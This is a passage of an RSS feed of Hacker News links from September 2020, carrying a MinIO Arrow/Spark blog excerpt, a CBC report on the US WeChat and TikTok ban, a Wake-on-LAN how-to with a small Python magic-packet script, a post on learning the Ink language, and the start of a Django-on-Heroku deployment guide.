1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Copy the arrow file we generated to MinIO bucket</figcaption></figure><p>Let's have some fun now. </p><p>Use your favorite Python editor, and write some code. First, let us start with Spark reading the file and converting it to a dataframe, with and without Arrow enabled options.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1698w" sizes="(min-width: 720px) 720px"><figcaption>Initializing Spark context and connection parameters to Minio</figcaption></figure><p>Start your Spark cluster. Complete the code with all settings and check whether we created the Spark context successfully. To ensure that our app (named Minio-Arrow-Spark at line 8) is connected, just check the Spark UI. You should see something like this:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Spark UI (default localhost:8080) is showing our app is connected</figcaption></figure><p>Run the below code now:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1708w" sizes="(min-width: 720px) 720px"><figcaption>Reading from MinIO with Arrow format "not enabled" (top) and "enabled"(bottom)</figcaption></figure><p>The output which displays the time, shows the power of this approach. The performance boost is tremendous, almost 50%.</p><p>Recall that we created an ArrowRDD earlier and used it to write to MinIO. Let us test the memory consumption in reading it. We will use different methods.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1882w" sizes="(min-width: 720px) 720px"><figcaption>See the results - Arrow is zero copy memory format</figcaption></figure><p>We are reading different file formats and seeing the memory consumption for each. As it is evident, Arrow format based files are zero copy - almost no memory consumed at all.</p><p>By combining MinIO with the Arrow Format, you can enhance your analytics ecosystem and virtually eliminating the friction associated with converting between different formats. This is primarily due to the reduction of serialization overhead.</p><h2 id="code">Code </h2><p>You can see the<a href="https://github.com/passionbytes/ArrowRDD"> Jupyter notebook and ArrowRDD code here</a>.</p><p>Ravishankar Nair is a technology evangelist, a consultant and an inspiring speaker. He is the CTO of PassionBytes, based in Florida. With his vast expertise in data engineering, Ravi provides consultancy in machine learning, modern data lakes and distributed computing technology. You can refer to his other articles related to MinIO here:</p><p>1) <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">Modern Data Lakes with Minio - Part 1</a></p><p>2) <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">Modern Data Lakes with MinIO - Part 2</a></p><p>3) <a href="https://blog.min.io/building-an-on-premise-ml-ecosystem-with-minio-powered-by-presto-r-and-s3select-feature/">Building an ‚Ä¶</a></p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517507</guid>
            <pubDate>Fri, 18 Sep 2020 14:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517499">thread link</a>) | @woranl
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517499</guid>
            <pubDate>Fri, 18 Sep 2020 14:51:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Configuring Wake-on-LAN]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517364">thread link</a>) | @jannes
<br/>
September 18, 2020 | https://jannesmeyer.com/blog/2020/wol | <a href="https://web.archive.org/web/*/https://jannesmeyer.com/blog/2020/wol">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Sometimes it's the little improvements in your workflow that give you the most satisfaction and you wonder why you hadn't made the change earlier. For me, configuring Wake-On-LAN (WOL) on my desktop PC has been one of those improvements.</p>
<p>It allows me to boot my PC on a schedule during weekdays and there are many mobile apps that allow you to send the wake command from your phone.</p>

<h2 id="1-receiving-the-wake-command-bios">1. Receiving the Wake Command (BIOS)</h2>
<p>Some motherboards have a BIOS setting for enabling Wake-On-LAN. You can look for it under names such as <em>Resume on LAN, Wake-On-LAN, WOL, Power Management</em> or similar. However, it is also possible that your motherboard doesn't have a setting for this. In that case it's either not supported or it's always enabled. You will find out more soon enough, but you could also check your motherboard manufacturer's manual.</p>
<p>The next step is going to be specific to your operating system. I will describe my experience with Windows. If you use Linux or macOS, there are <a href="https://www.lifewire.com/wake-on-lan-4149800">handy guides</a> for those elsewhere on the internet. (<a href="#3-finding-the-network-adapters-mac-address">Jump to step 3</a> in that case)</p>
<h2 id="2-receiving-the-wake-command-windows">2. Receiving the Wake Command (Windows)</h2>
<p>The first step is to configure your network adapter. Just go to the Device Manager (<code>Win+X</code> then <code>M</code>, or run <code>devmgmt.msc</code>) and choose the network adapter that you use for your network connection (usually Realtek or Intel).</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/devmgmt.png" alt="Windows Device Manager showing Intel network adapter as selected"></p>
<p>Double-click the network adapter and go to the <strong>Advanced</strong> tab. Here you have a list of settings for the driver. The one we are interested in is called <strong>Wake on Magic Packet</strong> near the bottom of the list. This needs to be set to <strong>Enabled</strong>.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/womp.png" alt="Wake on Magic Packet: Enabled"></p>
<p>Next, you need to go to the <strong>Power Management</strong> tab and tick <strong>Allow this device to wake up the computer</strong>.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/wakecomputer.png" alt="Power Management tab with the Wake Up setting highlighted"></p>
<p>Now that this is enabled, you should hopefully be able to start the PC with a WOL packet. But if it still doesn't work, there may be one more thing you can try.</p>
<p>I have an Asus motherboard with a network chip from Intel. Most people probably install the network driver that is provided by the OEM's website in the downloads section of their motherboard/computer. I originally had the Asus-provided driver installed, but apparently Asus decided it was a good idea to break the WOL feature on the Intel driver. This is rather confusing because I had no idea the OEMs even customise Intel's drivers.</p>
<p>What I had to do was to go to <a href="https://downloadcenter.intel.com/product/36773/Ethernet-Products">Intel's driver page</a> and download an unmodified version of the network driver.</p>
<p>Once I had the correct driver installed, the WOL feature started working immediately, but it's a good idea to make sure the driver installation did not reset the settings in the device manager.</p>
<p>Now you should be good to go for receiving the WOL packets.</p>
<h2 id="3-finding-the-network-adapters-mac-address">3. Finding the Network Adapter's MAC Address</h2>
<p>The next step is to figure out the MAC address of your network adapter. On Windows you can do it with the command <code>ipconfig /all</code>.</p>
<p>Look for the <strong>Physical Address</strong> field on the adapter whose <strong>Description</strong> matches the name of your adapter:</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/ipconfig.png" alt="ipconfig output showing the MAC address"></p>
<p>On Linux and macOS, it works quite similar with the command <code>ifconfig</code>.</p>
<h2 id="4-finding-the-networks-broadcast-address">4. Finding the Network's Broadcast Address</h2>
<p>Now the only thing left to do is to find the broadcast address of your network. It is defined as the last IPv4 address in your subnet. So you can easily derive it from your IP address and subnet mask.</p>
<p>If your IP address is <code>192.168.1.3</code> and your subnet mask is <code>255.255.255.0</code> then your broadcast address is <code>192.168.1.255</code>.</p>
<h2 id="5-sending-the-wake-command">5. Sending the Wake Command</h2>
<p>On iOS there is an app called <a href="https://apps.apple.com/app/wake-me-up-wake-on-lan/id1465416032">Wake Me Up</a> which can send the "magic" network packet. This app is nice because it integrates with Apple's Shortcuts app, which means you can also send a WOL command in a shortcut.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/wakemeup.png" alt="Wake Me Up app"></p>
<p>On other systems like a <a href="https://www.raspberrypi.org/">Raspberry Pi</a> or a NAS server I use this little Python script which I call <code>wake.py</code>:</p>
<pre>
<span>import</span> socket

mac = <span>'\xAA\xBB\xCC\xDD\xEE\xFF'</span> 
broadcast_ip = <span>'192.168.1.255'</span>   
port = <span>9</span>

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, <span>1</span>)
sock.sendto(<span>'\xFF'</span> * <span>6</span> + mac * <span>16</span>, (broadcast_ip, port))</pre><p>Of course, this script needs to be customised with the addresses you obtained in steps 3 and 4. Leaving the port set to 9 should be fine, but you can also try port 7 or 0.</p>
<p>Now you can easily run it with your system's Python interpreter.</p>
<h2 id="final-notes">Final Notes</h2>
<p>I hope these steps were enough to get you up and running with WOL. Personally, I have configured my local NAS (any server will do) to run the Python script every working day around 10 minutes before I start working, so I always find my PC ready to go when I am working from home. If you don't have a server and are not looking to buy a Raspberry Pi, you might be able to get some use out <strong>Personal Automations</strong> in the Apple Shortcuts app, which can trigger an automation whenever you turn off your phone's alarm. Since iOS 14 you can even create automations that run fully in the background (turn off <strong>Ask Before Running</strong> when creating the automation).</p>
<p>Please let me know if you know anything else that should be mentioned in this article. Just send me an email at <a href="mailto:contact@jannesmeyer.com">contact@jannesmeyer.com</a>.</p>
</div></div>]]>
            </description>
            <link>https://jannesmeyer.com/blog/2020/wol</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517364</guid>
            <pubDate>Fri, 18 Sep 2020 14:41:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning the Ink Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517321">thread link</a>) | @healeycodes
<br/>
September 18, 2020 | https://healeycodes.com/learning-the-ink-programming-language/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/learning-the-ink-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I first heard about the <a href="https://dotink.co/">Ink</a> programming language when I came across <a href="https://github.com/thesephist/polyx">Polyx</a>. Polyx is a productivity suite written in Ink that includes homegrown replacements for Dropbox and Trello as well as a personal relationship manager and a read-it-later service. <a href="https://thesephist.com/">Linus Lee</a> is the sole author of Ink and Polyx. I read through the source code of Polyx because I was interested in owning my own personal infrastructure ‚Äî and this was the start of my journey with Ink!</p>
<blockquote>
<p>A functional language that takes after modern JavaScript and Go</p>
</blockquote>
<p>Ink exists in the area between a hobby project and a fully grown programming language. It has <a href="https://dotink.co/docs/">documentation</a>, open source <a href="https://dotink.co/docs/projects/">projects</a>, and it‚Äôs actively developed with regular releases. It is easy to extend, and the source code is clear and understandable. It‚Äôs got warts, sure, but you could write an application with it that gets you a customer and earns you a dollar.</p>
<p>I sent an email to Linus to chat about the language and he pointed me to some of his newer Ink projects that contained the most idiomatic code to learn from (which were <a href="https://github.com/thesephist/september">September</a> and <a href="https://github.com/thesephist/inkfmt">inkfmt</a>). He also fast tracked a planned VS Code <a href="https://github.com/thesephist/ink-vscode">syntax highlighting extension</a> when he found out what editor I was using!</p>
<p>I spent a few weeks learning the language and created <a href="https://inkbyexample.com/">Ink by Example</a> ‚Äî a hands-on introduction to Ink using annotated example programs. Why was my first major project a learning resource? Well, writing about a topic helps me understand it but trying to teach a topic leads me to the hard questions that build mastery.</p>
<p>With technical topics, you meet the same problems that arise when trying to absorb a book. In <a href="https://andymatuschak.org/books/">Why books don‚Äôt work</a>, Andy Matuschak writes:</p>
<blockquote>
<p>Have you ever had a book like this‚Äîone you‚Äôd read‚Äîcome up in conversation, only to discover that you‚Äôd absorbed what amounts to a few sentences? I‚Äôll be honest: it happens to me regularly. Often things go well at first. I‚Äôll feel I can sketch the basic claims, paint the surface; but when someone asks a basic probing question, the edifice instantly collapses</p>
</blockquote>
<p>Until I explain a topic in a permanent medium (one that exists outside my own head) I don‚Äôt know what I don‚Äôt know. I fix this by building a structure from the basic principles all the way to the tricky nodes at the end of the graph. This can be via notes, an article, or a project.</p>
<h2 id="building-learning"><a href="#building-learning" aria-label="building learning permalink"></a>Building, Learning</h2>
<p>The best way to learn a language is to build something. Ideally, something that solves a personal problem (this motivation will drive you through the quagmires to victory). The structure of Ink by Example is <del>modelled after</del> stolen from Go by Example.</p>
<p>I enjoy language resources that zoom in on a tiny slice of the syntax and give you clean examples. Usually, this starts with printing to console.</p>
<div data-language="ink"><pre><code>std := load('../vendor/std')
log := std.log

log('hello world')</code></pre></div>
<p>If someone is fluent in another programming language they will want to know how to do <em>X</em> in <em>Y</em>. They seek to translate the building blocks that they‚Äôre familiar with; data structures, functions, and system interfaces.</p>
<p>The home page of Ink by Example presumes that you know what question you‚Äôre asking. It‚Äôs designed for an intermediate programmer.</p>
<p><span>
      <a href="https://healeycodes.com/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" title="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" src="https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" srcset="https://d33wubrfki0l68.cloudfront.net/96e5028841504f3396b4175c05d816ded6f12913/f3054/static/27460cf041bae463dffa8bab25929dfd/5a46d/list.png 300w,
https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png 425w" sizes="(max-width: 425px) 100vw, 425px" loading="lazy">
  </a>
    </span></p>
<p>When building and learning at the same time I like a resource that <em>shows how something works</em>. The ‚Äòhow‚Äô ‚Äî not the ‚Äòwhy‚Äô. A section of code annotated with enough information to get you started. A section of code that you can copy, change two lines, and ship!</p>
<p><span>
      <a href="https://healeycodes.com/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Random example page that explains how rand() and urand() work" title="The Random example page that explains how rand() and urand() work" src="https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" srcset="https://d33wubrfki0l68.cloudfront.net/ac7b7b3f1ab05213b586aa2d68f52ae05768e98c/f68c1/static/67e41456d3cd45e1904a481615c03fb8/5a46d/example.png 300w,
https://d33wubrfki0l68.cloudfront.net/c02a29e120f10890078f58281a553fcfbd2a9078/5c915/static/67e41456d3cd45e1904a481615c03fb8/0a47e/example.png 600w,
https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png 942w" sizes="(max-width: 942px) 100vw, 942px" loading="lazy">
  </a>
    </span></p>
<p>The build tool chain for the project is powered by Ink and the <a href="https://github.com/healeycodes/inkbyexample">repository</a> builds and deploys to Netlify on commits to the main branch. </p>
<p>I set it up to be fairly hackable. There are two HTML templates (bases for index and example) that are imported as strings and formatted with Ink‚Äôs <code>std.format</code>. The order that the examples are shown is controlled by <code>examples.ink</code>. The program files are structured like a table with documentation and code in parallel cells.</p>
<p>The program files are turned into executable code and evaluated when the test or build commands are ran. This was useful during development because it gave me full certainty that these code examples actually worked. (Unit tests would have been better!)</p>
<p>The templates are compiled and written to <code>/public</code> as HTML files, along with a few static files like CSS and an <code>og:image</code>.</p>
<p>For syntax highlighting, I read through another Ink project called <a href="https://github.com/thesephist/september">September</a> and saw that it provided a print command that sent Ink source code to the terminal with syntax highlighting via ANSI escape codes. I imported the files required for highlighting and altered the escape code functions to instead wrap the lines in <code>&lt;span&gt;</code> elements with different class names.</p>
<div data-language="ink"><pre><code>` before: if comment, apply ansi.Gray function `
(Tok.Comment) -&gt; Gray

` after: if comment, wrap in span to target via class in HTML `
(Tok.Comment) -&gt; s =&gt; '&lt;span class="c"&gt;' + s + '&lt;/span&gt;'</code></pre></div>
<p>The annotated examples programs are designed to print out a lot of data. This is rendered under the source code as if the file has been ‚Äòran‚Äô in a terminal to create a natural feel for an intermediate programmer and to show the shape of the data we‚Äôre dealing with.</p>
<p><span>
      <a href="https://healeycodes.com/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The section of output under the annotated program as if it has been ran via terminal" title="The section of output under the annotated program as if it has been ran via terminal" src="https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" srcset="https://d33wubrfki0l68.cloudfront.net/0e54072057bc336bed318e160c9e067e964d5aea/d1983/static/1ff63ca42124214c2cda9a5d999dbfac/5a46d/output.png 300w,
https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png 506w" sizes="(max-width: 506px) 100vw, 506px" loading="lazy">
  </a>
    </span></p>
<p>Since everything builds to a folder called <code>/public</code>, the Netlify configuration is just two lines long. The build time is 17 seconds long.</p>
<div data-language="toml"><pre><code><span>[</span><span>build</span><span>]</span>
  <span>publish</span> <span>=</span> <span>"public/"</span>
  <span>command</span> <span>=</span> <span>"make build-linux"</span></code></pre></div>
<h2 id="why-learn-ink-at-all"><a href="#why-learn-ink-at-all" aria-label="why learn ink at all permalink"></a>Why Learn Ink At All?</h2>
<p>Sometimes I am too career driven in the languages and technologies that I pick up. So I wanted to make sure that I was still learning to explore and be creative ‚Äî unencumbered by StackOverflow surveys that detail what technologies make you most employable. And what is more esoteric than a language that only two people actively code with (to my knowledge: myself and Linus).</p>
<p>I find Ink enjoyable to write code with. It‚Äôs terse, functional, and for small solutions it‚Äôs extremely clear to read. Programs are easy to share and deploy; a binary and a script. After reading some of Linus‚Äôs passionate <a href="https://dotink.co/posts/">technical articles</a> about Ink I felt an unexplainable yearning to try it out. So I did.</p>
<p>The future of Ink sounds exciting. I caught up with Linus a few days ago and he hinted at an experimental implementation written in Rust. He suggested some language problems that might be fixed too. He also pointed me towards resources on interpreters and compilers which I‚Äôve been devouring. Who knows ‚Äî maybe I‚Äôll be writing about my own programming language one day soon.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/learning-the-ink-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517321</guid>
            <pubDate>Fri, 18 Sep 2020 14:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to deploy a Django web application to Heroku ‚Äì a comprehensive guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517230">thread link</a>) | @Didicodes
<br/>
September 18, 2020 | https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z | <a href="https://web.archive.org/web/*/https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The process of taking a project from a local machine to the internet is in many ways a magical one. Heroku is a platform-as-a-service solution that offers simple deployment options to developers. This article will present a step-by-step guide to deploying Django applications on <a target="_blank" href="https://www.heroku.com/">Heroku</a>.</p>
<h3 id="deployment-setup">Deployment setup</h3>
<p>First, ensure that you have the Heroku CLI installed. If you do not, <a target="_blank" href="https://devcenter.heroku.com/articles/heroku-cli">visit this link</a> for installation instructions.</p>
<pre><code>heroku -v
</code></pre>
<p>Log into Heroku, by using the command below. This should open up your default browser, and prompt you to authenticate via the click of a button.</p>
<pre><code>heroku login
</code></pre>
